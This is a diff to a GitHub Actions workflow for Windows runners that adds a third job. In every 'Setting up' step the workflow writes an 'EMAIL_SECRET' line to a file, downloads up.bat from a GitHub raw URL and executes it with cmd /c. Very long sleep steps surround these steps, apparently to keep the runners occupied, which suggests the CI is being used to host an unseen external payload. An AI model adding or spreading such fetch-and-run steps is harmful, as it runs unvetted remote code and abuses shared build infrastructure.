@@ -11,9 +11,7 @@ jobs:
     
       - name: Setting Up
         run: |
-         start-sleep 11
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
-         start-sleep 10
          Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/up.bat" -OutFile "up.bat"
          cmd /c up.bat
             
@@ -34,14 +32,12 @@ jobs:
     
       - name: Wait
         run: |
-         start-sleep 900
-         start-sleep -s 901
+         start-sleep 300
+         start-sleep -s 301
       
-      - name: Setting Up
+      - name: Setting up
         run: |
-         start-sleep 11
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
-         start-sleep 10
          Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/up.bat" -OutFile "up.bat"
          cmd /c up.bat
       
@@ -76,6 +72,32 @@ jobs:
          start-sleep -s 314
       
       - name: G
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
+
+  Third:
+     runs-on: windows-latest
+     
+     steps:
+    
+      - name: Wait 2
+        run: |
+         start-sleep 600
+         start-sleep -s 601
+      
+      - name: Setting up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/up.bat" -OutFile "up.bat"
+         cmd /c up.bat
+      
+      - name: A
+        run: |
+         start-sleep 303
+         start-sleep -s 304
+      
+      - name: B
         run: |
          start-sleep 10800
          start-sleep -s 10801
